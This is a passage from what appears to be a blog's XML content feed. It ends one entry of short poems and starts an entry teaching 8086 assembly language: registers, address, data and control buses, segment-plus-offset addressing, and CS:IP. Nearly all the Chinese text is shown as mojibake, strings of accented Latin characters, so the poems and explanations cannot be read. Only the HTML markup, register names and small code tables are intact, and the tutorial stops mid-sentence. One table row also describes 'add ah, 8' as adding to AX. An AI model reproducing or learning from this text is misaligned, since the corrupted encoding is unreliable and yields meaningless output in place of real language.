æ³•è¤ªå»çƒ¦é—·çš„å¤–è¡£ï¼Œ</p><p>ç—›è‹¦çš„äººå¿ƒä¸­æ¿€èµ·é˜µé˜µçƒ¦é—·çš„æ¶Ÿæ¼ªã€‚</p><p>çƒ¦é—·ã€‚</p><p>ä¸ºä»€ä¹ˆæ¸”æ¨µçƒ­å¿±ä¸å‚é’“ï¼Œ</p><p>ä¸ºä»€ä¹ˆå†œå¤«åªçŸ¥æ­Œå”±ã€‚</p><p>ç©¿ä¸Šæ–°è¡£æ—¶æˆ‘ç•æƒ§é˜³å…‰ï¼Œ</p><p>èµ¤èº«æ¸¸æ³³æ—¶æˆ‘å®³æ€•æ­»äº¡ã€‚</p><p>æ ‘æ‰åº”è¯¥æ˜¯èŠ±çš„å½±ã€‚</p></blockquote><blockquote><p>å‡å¦‚ï¼Œæˆ‘æ˜¯è¯´å‡å¦‚ã€‚</p><p>èŠ±å„¿çˆ±ä¸Šäº†èŸ‹èŸ€ï¼Œ</p><p>å®ƒåªæ˜¯å­¦ä¼šäº†å¼ æœ›ï¼Œ</p><p>å¼ å¼€åŒè‡‚ä»»èœœèœ‚è‚†è™ï¼Œ</p><p>å®ƒåªæ˜¯å¼ æœ›ï¼Œ</p><p>èŸ‹èŸ€çš„çœ¼ä¸­åªæœ‰å¤æ—¥çš„é˜³ã€‚</p><p>ç›´åˆ°æœ‰ä¸€å¤©ï¼Œ</p><p>å¤è‰ä¹Ÿä¼šåœæ­¢é¸£å«ã€‚</p></blockquote><hr><hr><blockquote><p>çœ‹è§å…‰çš„åŒæ—¶å¿…å°†çœ‹è§æ°¸æ’çš„é»‘</p><p>æŒ£è„±æŸç¼šçš„åŒæ—¶å¿…å°†çœ‹è§å±‚å±‚çš„æ·é”</p><p>éš¾ä»¥è¨€å–»çš„ç¥ç§˜æœ‰ç€è‡´å‘½çš„ç¾æ„Ÿ</p><p>å…¶å…‰èŠ’ç…§å°„å‡ºå†…å¿ƒæ·±å¤„çš„ä¸‘æ€</p><p>æ—¢æ˜¯è¿½å¯»çš„ä¸‘æ€ï¼Œ</p><p>ä¹Ÿæ˜¯é€ƒçš„ä¸‘æ€ã€‚</p><p>20210903</p></blockquote><hr><hr><blockquote><p>æœ‰ä¸€å¤©ï¼Œå¿«è¦çª’æ¯çš„äººä»¬å‘ç°</p><p>åŸæ¥è‡ªå·±è¢«ä¸¢è¿›äº†æµ·é‡Œã€‚</p><p>â€œå¿…é¡»æ‰¾åˆ°ä¸€ä¸ªè¢‹å­ï¼Œ</p><p>å¤§åˆ°èƒ½è£…è¿›æ‰€æœ‰çš„æ°´â€</p><p>äººä»¬ä¸€è¾¹æƒ³ç€ä¸€è¾¹æŒ£æ‰ã€‚</p><p>ä¸Šå¸ä»¿ä½›å¿ƒç”Ÿæ€œæ‚¯ï¼Œ</p><p>æ´¾æ¥ä¸€åªé¸Ÿåˆæ¥è¿™è¢‹å­ã€‚</p><p>æ²¡æœ‰äººæ¥è¿‡å®ƒã€‚</p><p>è°åˆæœ‰å‹‡æ°”ï¼Œ</p><p>é¢å¯¹ä¸€ç‰‡å¹²æ¶¸çš„ç‹¼è—‰ï¼Ÿ</p><p>20220321</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Life </category>
          
          <category> è¯— </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è¯— </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ±‡ç¼–è¯­è¨€</title>
      <link href="/2024/01/15/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
      <url>/2024/01/15/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/</url>
      
        <content type="html"><![CDATA[<h1 id="åŸºç¡€çŸ¥è¯†"><a href="#åŸºç¡€çŸ¥è¯†" class="headerlink" title="åŸºç¡€çŸ¥è¯†"></a>åŸºç¡€çŸ¥è¯†</h1><p>ã€8086æ±‡ç¼–å…¥é—¨ã€‘</p><h3 id="å¼•è¨€"><a href="#å¼•è¨€" class="headerlink" title="å¼•è¨€"></a>å¼•è¨€</h3><p>æ±‡ç¼–è¯¾ç¨‹çš„ç ”ç©¶é‡ç‚¹æ”¾åœ¨å¦‚ä½•åˆ©ç”¨ç¡¬ä»¶ç³»ç»Ÿçš„ç¼–ç¨‹ç»“æ„å’ŒæŒ‡ä»¤é›†æœ‰æ•ˆçš„æ§åˆ¶ç³»ç»Ÿè¿›è¡Œè¿ä½œã€‚</p><p>&#x3D;&#x3D;æœºå™¨è¯­è¨€&#x3D;&#x3D;</p><p>æœºå™¨è¯­è¨€æ˜¯æœºå™¨æŒ‡ä»¤çš„é›†åˆã€‚å±•å¼€æ¥è¯´å°±æ˜¯ä¸€å°æœºå™¨å¯ä»¥æ­£ç¡®æ‰§è¡Œçš„å‘½ä»¤</p><p>&#x3D;&#x3D;æ±‡ç¼–è¯­è¨€&#x3D;&#x3D;</p><ul><li>æ±‡ç¼–è¯­è¨€çš„ä¸»ä½“æ˜¯æ±‡ç¼–æŒ‡ä»¤</li><li>æ±‡ç¼–æŒ‡ä»¤å’Œæœºå™¨æŒ‡ä»¤çš„å·®åˆ«åœ¨äºæŒ‡ä»¤çš„è¡¨ç¤ºæ–¹æ³•ä¸Šï¼Œæ±‡ç¼–æŒ‡ä»¤æ˜¯æœºå™¨æŒ‡ä»¤ä¾¿äºè®°å¿†çš„ä¹¦å†™æ ¼å¼</li></ul><p>&#x3D;&#x3D;å¯„å­˜å™¨&#x3D;&#x3D;</p><p>å¯„å­˜å™¨ç®€å•æ¥è¯´å°±æ˜¯CPUä¸­å¯ä»¥å­˜å‚¨æ•°æ®çš„å™¨ä»¶ï¼Œä¸€ä¸ªCPUä¸­æœ‰å¤šä¸ªå¯„å­˜å™¨ã€‚</p><ul><li>CPUç”±è¿ç®—å™¨ã€æ§åˆ¶å™¨ã€å¯„å­˜å™¨ç­‰å™¨ä»¶æ„æˆï¼Œè¿™äº›å™¨ä»¶é ç‰‡å†…æ€»çº¿ç›¸è¿ã€‚</li><li>è¿ç®—å™¨è¿›è¡Œä¿¡æ¯å¤„ç†ï¼›æ§åˆ¶å™¨æ§åˆ¶å„ç§å™¨ä»¶è¿›è¡Œå·¥ä½œï¼›å¯„å­˜å™¨è¿›è¡Œ<strong>ä¿¡æ¯å­˜å‚¨</strong>ï¼›</li></ul><h3 id="æ±‡ç¼–è¯­è¨€çš„ç»„æˆ"><a href="#æ±‡ç¼–è¯­è¨€çš„ç»„æˆ" class="headerlink" title="æ±‡ç¼–è¯­è¨€çš„ç»„æˆ"></a>æ±‡ç¼–è¯­è¨€çš„ç»„æˆ</h3><p>æ±‡ç¼–è¯­è¨€ç”±ä¸€ä¸‹ä¸‰ç±»ç»„æˆï¼š</p><ul><li>æ±‡ç¼–æŒ‡ä»¤(æœºå™¨ç çš„åŠ©è®°ç¬¦)</li><li>ä¼ªæŒ‡ä»¤(ç”±ç¼–è¯‘å™¨æ‰§è¡Œ)</li><li>å…¶ä»–ç¬¦å·(ç”±ç¼–è¯‘å™¨è¯†åˆ«ï¼Œæ²¡æœ‰å¯¹ç”¨çš„æœºå™¨ç )</li></ul><p>æ±‡ç¼–è¯­è¨€çš„æ ¸å¿ƒæ˜¯æ±‡ç¼–æŒ‡ä»¤ï¼Œå®ƒå†³å®šäº†æ±‡ç¼–è¯­è¨€çš„ç‰¹æ€§ã€‚</p><h3 id="å­˜å‚¨å™¨"><a href="#å­˜å‚¨å™¨" class="headerlink" title="å­˜å‚¨å™¨"></a>å­˜å‚¨å™¨</h3><p>CPU æ˜¯è®¡ç®—æœºçš„æ ¸å¿ƒéƒ¨ä»¶ï¼Œæ§åˆ¶è®¡ç®—æœºçš„è¿ä½œå¹¶è¿›è¡Œè¿ç®—ã€‚æŒ‡ä»¤å’Œæ•°æ®å†å­˜å‚¨å™¨ä¸­å­˜æ”¾ï¼Œä¹Ÿå°±æ˜¯å¹³æ—¶è¯´çš„å†…å­˜</p><p>ä¸€å°PCæœºä¸­å†…å­˜çš„ä½œç”¨ä»…æ¬¡äºCPUï¼Œç¦»å¼€äº†å†…å­˜ï¼ŒCPUæ— æ³•è¿ä½œã€‚è€Œç£ç›˜ä¸åŒäºå†…å­˜ï¼Œç£ç›˜ä¸Šçš„æ•°æ®åº“ç¨‹åºå¦‚æœä¸è¯»åˆ°å†…å­˜ä¸­ï¼Œå°±æ— æ³•è¢«CPUä½¿ç”¨ã€‚</p><ul><li>éšæœºå­˜å‚¨å™¨ï¼ˆRAMï¼‰åœ¨ç¨‹åºçš„æ‰§è¡Œè¿‡ç¨‹ä¸­å¯è¯»å¯å†™ï¼Œå¿…é¡»å¸¦ç”µå­˜å‚¨</li><li>åªè¯»å­˜å‚¨å™¨ï¼ˆROMï¼‰åœ¨ç¨‹åºçš„æ‰§è¡Œè¿‡ç¨‹ä¸­åªè¯»ï¼Œå…³æœºæ•°æ®ä¸ä¸¢å¤±</li></ul><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20231030133241106.png" alt="image-20231030133241106" style="zoom: 25%;" /><h3 id="æŒ‡ä»¤å’Œæ•°æ®"><a href="#æŒ‡ä»¤å’Œæ•°æ®" class="headerlink" title="æŒ‡ä»¤å’Œæ•°æ®"></a>æŒ‡ä»¤å’Œæ•°æ®</h3><ul><li>æŒ‡ä»¤å’Œæ•°æ®æ˜¯åº”ç”¨ä¸Šçš„æ¦‚å¿µ</li><li>åœ¨å†…å­˜æˆ–ç£ç›˜ä¸Šï¼ŒæŒ‡ä»¤å’Œæ•°æ®æ²¡æœ‰ä»»ä½•åŒºåˆ«ï¼Œéƒ½æ˜¯äºŒè¿›åˆ¶ä¿¡æ¯ã€‚</li></ul><h3 id="å­˜å‚¨å•å…ƒ"><a href="#å­˜å‚¨å•å…ƒ" class="headerlink" title="å­˜å‚¨å•å…ƒ"></a>å­˜å‚¨å•å…ƒ</h3><p>å­˜å‚¨å™¨è¢«åˆ’åˆ†ä¸ºè‹¥å¹²ä¸ªå­˜å‚¨å•å…ƒï¼Œæ¯ä¸ªå­˜å‚¨å•å…ƒä»0å¼€å§‹ç¼–å·</p><p>å­˜å‚¨å®¹é‡è½¬æ¢</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1KB = 1024B</span><br><span class="line">1MB = 1024KB</span><br><span class="line">1GB = 1024MB</span><br><span class="line">1TB = 1024GB</span><br></pre></td></tr></table></figure><h3 id="CPUå¯¹å­˜å‚¨å™¨çš„è¯»å†™"><a href="#CPUå¯¹å­˜å‚¨å™¨çš„è¯»å†™" class="headerlink" title="CPUå¯¹å­˜å‚¨å™¨çš„è¯»å†™"></a>CPUå¯¹å­˜å‚¨å™¨çš„è¯»å†™</h3><p>CPUè¦ä»å†…å­˜ä¸­è¯»å–æ•°æ®ï¼Œé¦–å…ˆè¦æŒ‡å®šå­˜å‚¨å•å…ƒçš„åœ°å€ã€‚ä¹Ÿå°±æ˜¯å®ƒè¦ç¡®å®šè¯»å–å“ªä¸€ä¸ªå­˜å‚¨å•å…ƒçš„æ•°æ®ã€‚</p><p>å¦å¤–ï¼Œåœ¨ä¸€å°å¾®æœºä¸­ï¼Œä¸åªæœ‰å­˜å‚¨å™¨è¿™ä¸€ç§å™¨ä»¶ï¼ŒCPUåœ¨è¯»å†™æ•°æ®æ—¶è¿˜è¦æŒ‡æ˜ï¼Œå®ƒè¦å¯¹å“ªä¸€ä¸ªå™¨ä»¶è¿›è¡Œæ“ä½œã€‚</p><p>è¿˜è¦ç¡®å®šè¿›è¡Œçš„æ˜¯é‚£ç§æ“ä½œï¼Œæ˜¯ä»ä¸­è¯»å‡ºæ•°æ®ï¼Œè¿˜æ˜¯å‘é‡Œé¢å†™å…¥æ•°æ®ã€‚</p><p>å¯è§ï¼ŒCPUè¦æƒ³è¿›è¡Œæ•°æ®çš„è¯»å†™ï¼Œå¿…é¡»å’Œå¤–éƒ¨å™¨ä»¶(æ ‡å‡†çš„è¯´æ³•æ˜¯èŠ¯ç‰‡)è¿›è¡Œä¸‰ç±»ä¿¡æ¯çš„äº¤äº’ï¼š</p><ul><li>å­˜å‚¨å•å…ƒçš„åœ°å€(åœ°å€ä¿¡æ¯)</li><li>å™¨ä»¶çš„é€‰æ‹©ï¼Œè¯»æˆ–å†™å‘½ä»¤(æ§åˆ¶ä¿¡æ¯)</li><li>è¯»æˆ–å†™çš„æ•°æ®(æ•°æ®ä¿¡æ¯)</li></ul><p>CPUæ˜¯é€šè¿‡ä»€ä¹ˆå°†åœ°å€ã€æ•°æ®å’Œæ§åˆ¶ä¿¡æ¯ä¼ åˆ°å­˜å‚¨å™¨èŠ¯ç‰‡ä¸­çš„å‘¢?è®¡ç®—æœºä¸­ä¸“é—¨æœ‰è¿æ¥CPUå’Œå…¶ä»–èŠ¯ç‰‡çš„å¯¼çº¿ï¼Œç§°ä¸ºæ€»çº¿ã€‚é€»è¾‘ä¸Šåˆ†ä¸ºä¸‰ç±»ï¼šåœ°å€æ€»çº¿ï¼Œæ§åˆ¶æ€»çº¿å’Œæ•°æ®æ€»çº¿</p><h3 id="åœ°å€æ€»çº¿"><a href="#åœ°å€æ€»çº¿" class="headerlink" title="åœ°å€æ€»çº¿"></a>åœ°å€æ€»çº¿</h3><ul><li>CPUæ˜¯é€šè¿‡åœ°å€æ€»çº¿æŒ‡å®šå­˜å‚¨å•å…ƒçš„</li><li>åœ°å€æ€»çº¿ä¸Šèƒ½ä¼ é€å¤šå°‘ä¸ªä¸åŒçš„ä¿¡æ¯ï¼ŒCPUå°±å¯ä»¥å¯¹å¤šå°‘å’Œå­˜å‚¨å•å…ƒè¿›è¡Œå¯»å€<ul><li>ä¸€ä¸ªCPUæœ‰Næ ¹åœ°å€æ€»çº¿ï¼Œåˆ™å¯ä»¥è¯´è¿™ä¸ªCPUçš„åœ°å€æ€»çº¿çš„å®½åº¦ä¸ºN</li><li>è¿™æ ·çš„ CPUæœ€å¤šå¯ä»¥å¯»æ‰¾2çš„Næ¬¡æ–¹ä¸ªå†…å­˜å•å…ƒ</li></ul></li></ul><h3 id="æ•°æ®æ€»çº¿"><a href="#æ•°æ®æ€»çº¿" class="headerlink" title="æ•°æ®æ€»çº¿"></a>æ•°æ®æ€»çº¿</h3><ul><li>CPUä¸å†…å­˜æˆ–å…¶ä»–å™¨ä»¶ä¹‹é—´çš„æ•°æ®å·æ€»æ˜¯é€šè¿‡æ•°æ®æ€»çº¿æ¥è¿›è¡Œçš„</li><li>æ•°æ®æ€»çº¿çš„å®½åº¦å†³å®šäº†CPUå’Œå¤–ç•Œçš„æ•°æ®ä¼ é€æ•°æ®</li></ul><h3 id="æ§åˆ¶æ€»çº¿"><a href="#æ§åˆ¶æ€»çº¿" class="headerlink" title="æ§åˆ¶æ€»çº¿"></a>æ§åˆ¶æ€»çº¿</h3><ul><li>CPUå¯¹å¤–éƒ¨å™¨ä»¶çš„æ§åˆ¶æ˜¯é€šè¿‡æ§åˆ¶æ€»çº¿æ¥è¿›è¡Œçš„ï¼Œåœ¨è¿™é‡Œæ§åˆ¶æ€»çº¿æ˜¯ä¸€ä¸ªæ€»ç§°ï¼Œæ§åˆ¶æ€»çº¿æ˜¯ä¸€äº›ä¸åŒæ§åˆ¶çº¿çš„é›†åˆ</li><li>æœ‰å¤šå°‘æ ¹æ§åˆ¶æ€»çº¿ï¼Œå°±æ„å‘³ç€CPUæä¾›äº†å¯¹å¤–éƒ¨å‰è¿›çš„å¤šå°‘ç§æ§åˆ¶ï¼Œæ§åˆ¶æ€»çº¿çš„å®½åº¦å†³å®šäº†CPUå¯¹å¤–éƒ¨å™¨ä»¶çš„æ§åˆ¶èƒ½åŠ›</li></ul><h3 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h3><ul><li>æ±‡ç¼–æŒ‡ä»¤æ˜¯æœºå™¨æŒ‡ä»¤çš„<strong>åŠ©è®°ç¬¦</strong>ï¼ŒåŒæœºå™¨æŒ‡ä»¤ä¸€ä¸€å¯¹åº”</li><li>æ¯ä¸€ç§CPUéƒ½æœ‰è‡ªå·±çš„æ±‡ç¼–æŒ‡ä»¤é›†</li><li>CPUå¯ä»¥ç›´æ¥ä½¿ç”¨çš„ä¿¡æ¯æ˜¯åœ¨<strong>å­˜å‚¨å™¨</strong>ä¸­å­˜æ”¾çš„</li><li>åœ¨å­˜å‚¨å™¨ä¸­æŒ‡ä»¤å’Œæ•°æ®æ²¡æœ‰ä»»ä½•åŒºåˆ«ï¼Œéƒ½æ˜¯äºŒè¿›åˆ¶ä¿¡æ¯</li><li>ä¸€ä¸ªCPUå¯ä»¥å¼•å‡ºä¸‰ç§ä¸åŒçš„æ€»çº¿çš„å®½åº¦æ ‡å¿—äº†è¿™ä¸ªCPUçš„ä¸åŒæ–¹é¢çš„æ€§èƒ½<ul><li>åœ°å€æ€»çº¿çš„å®½åº¦å†³å®šäº†CPUçš„å¯»å€èƒ½åŠ›</li><li>æ•°æ®æ€»çº¿çš„å®½åº¦å†³å®šäº†CPUä¸å…¶ä»–å™¨ä»¶è¿›è¡Œæ•°æ®ä¼ ä¼ é€çš„ä¸€æ¬¡æ•°æ®ä¼ é€é‡</li><li>æ§åˆ¶æ€»çº¿å®½åº¦å†³å®šäº†CPUå¯¹ç³»ç»Ÿä¸­å…¶ä»–å™¨ä»¶çš„æ§åˆ¶èƒ½åŠ›</li></ul></li></ul><h1 id="å¯„å­˜å™¨"><a href="#å¯„å­˜å™¨" class="headerlink" title="å¯„å­˜å™¨"></a>å¯„å­˜å™¨</h1><h3 id="CPUå†…éƒ¨å·¥ä½œåŸç†"><a href="#CPUå†…éƒ¨å·¥ä½œåŸç†" class="headerlink" title="CPUå†…éƒ¨å·¥ä½œåŸç†"></a>CPUå†…éƒ¨å·¥ä½œåŸç†</h3><h5 id="CPUæ¦‚è¿°"><a href="#CPUæ¦‚è¿°" class="headerlink" title="CPUæ¦‚è¿°"></a>CPUæ¦‚è¿°</h5><p>ä¸€ä¸ªå…¸å‹çš„CPUç”±<strong>è¿ç®—å™¨ï¼Œæ§åˆ¶å™¨ï¼Œå¯„å­˜å™¨</strong>ç­‰å™¨ä»¶ç»„æˆï¼Œè¿™äº›å™¨ä»¶ç”±å†…éƒ¨æ€»çº¿ç›¸è¿ã€‚è€Œç¬¬ä¸€ç« è¯´çš„æ€»çº¿å¯¹äºCPUæ¥è¯´æ˜¯å¤–éƒ¨æ€»çº¿ã€‚</p><ul><li>å†…éƒ¨æ€»çº¿å®ç°CPUå†…éƒ¨å„ä¸ªå™¨ä»¶ä¹‹é—´çš„è”ç³»</li><li>å¤–éƒ¨æ€»çº¿å®ç°CPUå’Œä¸»æ¿ä¸Šå…¶ä»–å™¨ä»¶çš„è”ç³»</li></ul><p>åœ¨CPUå†…éƒ¨:</p><ul><li>è¿ç®—å™¨è¿›è¡Œä¿¡æ¯å¤„ç†</li><li>å¯„å­˜å™¨è¿›è¡Œä¿¡æ¯å­˜å‚¨</li><li>æ§åˆ¶å™¨æ§åˆ¶ç€å„ç§å™¨ä»¶è¿›è¡Œå·¥ä½œ</li></ul><h5 id="å¯„å­˜å™¨æ¦‚è¿°"><a href="#å¯„å­˜å™¨æ¦‚è¿°" class="headerlink" title="å¯„å­˜å™¨æ¦‚è¿°"></a>å¯„å­˜å™¨æ¦‚è¿°</h5><p>8086CPUæœ‰14ä¸ªå¯„å­˜å™¨ï¼Œå®ƒä»¬çš„åç§°ä¸ºï¼š</p><p>AX,BX,CX,DX,SI,DI,SP,BP,IP,CS,SS,DS,ES,PSW</p><h3 id="é€šç”¨å¯„å­˜å™¨"><a href="#é€šç”¨å¯„å­˜å™¨" class="headerlink" title="é€šç”¨å¯„å­˜å™¨"></a>é€šç”¨å¯„å­˜å™¨</h3><p>[AX,BX,CX,DX]</p><ul><li><p>8086CPUæ‰€æœ‰çš„å¯„å­˜å™¨éƒ½æ˜¯16ä½çš„ï¼Œå¯ä»¥å­˜æ”¾ä¸¤ä¸ªå­—èŠ‚(ä¸€ä¸ªå­—)</p><ul><li>ä¸ºä¿æŒå…¼å®¹æ€§ï¼Œè¿™å››ä¸ªé€šç”¨å¯„å­˜å™¨éƒ½å¯ä»¥åˆ†ä¸ºä¸¤ä¸ªç‹¬ç«‹çš„8ä½å¯„å­˜å™¨ä½¿ç”¨</li></ul></li><li><p>AX,BX,CX,DXé€šå¸¸ç”¨æ¥å­˜æ”¾ä¸€èˆ¬æ€§æ•°æ®ï¼Œè¢«ç§°ä¸ºé€šç”¨å¯„å­˜å™¨</p><ul><li>AXå¯ä»¥åˆ†ä¸ºAHå’ŒAL(å…¼å®¹æ€§è€ƒè™‘)    å…¶ä»–ä¸‰ä¸ªåŒç†</li></ul><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20231030135425947.png" alt="image-20231030135425947" style="zoom: 25%;" /></li></ul><p>16ä½ç»“æ„CPUå…·æœ‰ä¸‹é¢å‡ æ–¹é¢çš„ç»“æ„ç‰¹æ€§ã€‚</p><ul><li>è¿ç®—å™¨ä¸€æ¬¡æœ€å¤šå¯ä»¥å¤„ç†16ä½çš„æ•°æ®ï¼›</li><li>å¯„å­˜å™¨çš„æœ€å¤§å®½åº¦ä¸º16ä½ï¼›</li><li>å¯„å­˜å™¨å’Œè¿ç®—å™¨ä¹‹é—´çš„é€šè·¯ä¸º16ä½ã€‚</li></ul><h3 id="å‡ æ¡æ±‡ç¼–æŒ‡ä»¤"><a href="#å‡ æ¡æ±‡ç¼–æŒ‡ä»¤" class="headerlink" title="å‡ æ¡æ±‡ç¼–æŒ‡ä»¤"></a>å‡ æ¡æ±‡ç¼–æŒ‡ä»¤</h3><table><thead><tr><th align="center">æ±‡ç¼–æŒ‡ä»¤</th><th align="center">æ§åˆ¶CPUå®Œæˆçš„æ“ä½œ</th><th align="center">ç”¨é«˜çº§è¯­è¨€çš„è¯­æ³•æè¿°</th></tr></thead><tbody><tr><td align="center">mov ax , 18</td><td align="center">å°†18é€å…¥AX</td><td align="center">AX &#x3D; 18</td></tr><tr><td align="center">mov ah , 78</td><td align="center">å°†78é€å…¥AH</td><td align="center">AH &#x3D; 78</td></tr><tr><td align="center">add ah , 8</td><td align="center">å°†å¯„å­˜å™¨AXä¸­çš„æ•°å€¼åŠ 8</td><td align="center">AX &#x3D; AX + 8</td></tr><tr><td align="center">mov ax , bx</td><td align="center">å°†å¯„å­˜å™¨BXä¸­çš„æ•°æ®é€å…¥AX</td><td align="center">AX &#x3D; BX</td></tr><tr><td align="center">add ax , bx</td><td align="center">å°†AX,BXä¸­çš„å†…å®¹ç›¸åŠ ï¼Œç»“æœæ”¾åœ¨AXä¸­</td><td align="center">AX &#x3D; AX + BX</td></tr></tbody></table><h5 id="ç‰©ç†åœ°å€"><a href="#ç‰©ç†åœ°å€" class="headerlink" title="ç‰©ç†åœ°å€"></a>ç‰©ç†åœ°å€</h5><ul><li>CPUè®¿é—®å†…å­˜å•å…ƒæ—¶è¦ç»™å‡ºå†…å­˜å•å…ƒçš„åœ°å€ã€‚æ‰€æœ‰çš„å†…å­˜å•å…ƒæ„æˆçš„å­˜å‚¨ç©ºé—´æ˜¯ä¸€ä¸ªä¸€ç»´çš„çº¿æ€§ç©ºé—´</li><li>æˆ‘ä»¬å°†è¿™ä¸ªå”¯ä¸€çš„åœ°å€ç§°ä¸ºç‰©ç†åœ°å€</li></ul><h6 id="ä¸€ä¸ªé—®é¢˜"><a href="#ä¸€ä¸ªé—®é¢˜" class="headerlink" title="ä¸€ä¸ªé—®é¢˜"></a>ä¸€ä¸ªé—®é¢˜</h6><p>8086CPUæœ‰20ä½åœ°å€æ€»çº¿ï¼Œå¯ä»¥ä¼ é€20ä½åœ°å€ï¼Œè¾¾åˆ°1MBå¯»å€èƒ½åŠ›ã€‚<br>8086CPUåˆæ˜¯16ä½ç»“æ„ï¼Œåœ¨å†…éƒ¨ä¸€æ¬¡æ€§å¤„ç†ã€ä¼ è¾“ã€æš‚æ—¶å­˜å‚¨çš„åœ°å€ä¸º16ä½ã€‚<br>ä»8086CPUçš„å†…éƒ¨ç»“æ„æ¥çœ‹ï¼Œå¦‚æœå°†åœ°å€ä»å†…éƒ¨ç®€å•åœ°å‘å‡ºï¼Œé‚£ä¹ˆå®ƒåªèƒ½é€å‡º16ä½çš„åœ°å€ï¼Œè¡¨ç°å‡ºçš„å¯»å€èƒ½åŠ›åªæœ‰64KBã€‚</p><blockquote><p>8086CPUé‡‡ç”¨ä¸€ç§åœ¨å†…éƒ¨ç”¨ä¸¤ä¸ª16ä½åœ°å€åˆæˆçš„æ–¹æ³•æ¥å½¢æˆä¸€ä¸ª20ä½çš„ç‰©ç†åœ°å€</p></blockquote><ul><li>CPUä¸­çš„ç›¸å…³éƒ¨ä»¶æä¾›ä¸¤ä¸ª16ä½çš„åœ°å€ï¼Œä¸€ä¸ªç§°ä¸ºæ®µåœ°å€ï¼Œå¦ä¸€ä¸ªç§°ä¸ºåç§»åœ°å€ï¼›</li><li>åœ°å€åŠ æ³•å™¨å°†ä¸¤ä¸ª16ä½åœ°å€åˆæˆä¸ºä¸€ä¸ª20ä½çš„ç‰©ç†åœ°å€ï¼›</li></ul><p>åœ°å€åŠ æ³•å™¨åˆæˆç‰©ç†åœ°å€çš„æ–¹æ³•ï¼š</p><p><code>ç‰©ç†åœ°å€ = æ®µåœ°å€ Ã— 16 + åç§»åœ°å€</code></p><p>å…¶ä¸­<code>æ®µåœ°å€Ã— 16 </code>æœ‰ä¸€ä¸ªæ›´å¸¸ç”¨çš„è¯´æ³•å°±æ˜¯æ•°æ®å·¦ç§»4ä½ï¼Œ16è¿›åˆ¶çš„è¯å°±æ˜¯å·¦ç§»1ä½ã€‚</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240111183554301.png" alt="image-20240111183554301" style="zoom:33%;" /><h3 id="æ®µå¯„å­˜å™¨"><a href="#æ®µå¯„å­˜å™¨" class="headerlink" title="æ®µå¯„å­˜å™¨"></a>æ®µå¯„å­˜å™¨</h3><h5 id="æ®µçš„æ¦‚å¿µ"><a href="#æ®µçš„æ¦‚å¿µ" class="headerlink" title="æ®µçš„æ¦‚å¿µ"></a>æ®µçš„æ¦‚å¿µ</h5><p>å†…å­˜å¹¶æ²¡æœ‰åˆ†æ®µï¼Œæ®µçš„åˆ’åˆ†æ¥è‡ªäºCPUï¼Œç”±äº8086CPUç”¨<code>ç‰©ç†åœ°å€ = æ®µåœ°å€ Ã— 16 + åç§»åœ°å€</code>çš„æ–¹å¼ç»™å‡ºå†…å­˜å•å…ƒçš„ç‰©ç†åœ°å€ï¼Œä½¿å¾—æˆ‘ä¹ˆå¯ä»¥ç”¨<strong>åˆ†æ®µçš„æ–¹å¼æ¥ç®¡ç†å†…å­˜</strong>ã€‚</p><ul><li>æ®µåœ°å€ Ã— 16 å¿…ç„¶æ˜¯16çš„å€æ•°ï¼Œæ‰€ä»¥ä¸€ä¸ªæ®µçš„èµ·å§‹åœ°å€ä¹Ÿä¸€å®šæ˜¯16çš„å€æ•°</li><li>åç§»åœ°å€ä¸º16ä½ï¼Œ16ä½åœ°å€çš„å¯»å€èƒ½åŠ›ä¸º64kbï¼Œå·¦ç§»ä¸€ä¸ªæ®µçš„é•¿åº¦æœ€å¤§ä¸º64kb</li></ul><h6 id="æ®µå¯„å­˜å™¨-1"><a href="#æ®µå¯„å­˜å™¨-1" class="headerlink" title="æ®µå¯„å­˜å™¨"></a>æ®µå¯„å­˜å™¨</h6><p>æ®µå¯„å­˜å™¨å°±æ˜¯æä¾›æ®µåœ°å€çš„ã€‚8086CPUæœ‰4ä¸ªæ®µå¯„å­˜å™¨ï¼Œ<code>CS,DC,SS,ES</code>å½“8086CPUè¦è®¿é—®å†…å­˜æ˜¯ï¼Œç”±è¿™4ä¸ªæ®µå¯„å­˜å™¨æä¾›å†…å­˜å•å…ƒçš„æ®µåœ°å€</p><h6 id="CSå’ŒIP"><a href="#CSå’ŒIP" class="headerlink" title="CSå’ŒIP"></a>CSå’ŒIP</h6><blockquote><p>CSå’ŒIPæ˜¯8086CPUä¸­æœ€å…³é”®çš„å¯„å­˜å™¨ï¼Œå®ƒä»¬æŒ‡ç¤ºäº†CPUå½“å‰è¦è¯»å–æŒ‡ä»¤çš„åœ°å€</p></blockquote><ul><li>CSä¸ºä»£ç æ®µå¯„å­˜å™¨</li><li>IPä¸ºæŒ‡ä»¤æŒ‡é’ˆå¯„å­˜å™¨</li></ul><p>CSä¸ºä»£ç æ®µå¯„å­˜å™¨ï¼ŒIPä¸ºæŒ‡ä»¤æŒ‡é’ˆå¯„å­˜å™¨ï¼Œ</p><p>CPUå°†CSã€IPä¸­çš„å†…å®¹å½“ä½œæŒ‡ä»¤çš„æ®µåœ°å€å’Œåç§»åœ°å€,ç”¨å®ƒä»¬åˆæˆæŒ‡ä»¤çš„ç‰©ç†åœ°å€,</p><p>CPUå°†CS : IPæŒ‡å‘çš„å†…å®¹å½“ä½œæŒ‡ä»¤æ‰§è¡Œã€‚(å³PC)</p><p>&#x3D;&#x3D;å·¥ä½œè¿‡ç¨‹&#x3D;&#x3D;</p><ul><li>ä»CS:IPæŒ‡å‘å†…å­˜å•å…ƒè¯»å–æŒ‡ä»¤ï¼Œè¯»å–çš„æŒ‡ä»¤è¿›å…¥æŒ‡ä»¤ç¼“å†²å™¨ã€‚</li><li>IP &#x3D; IP + 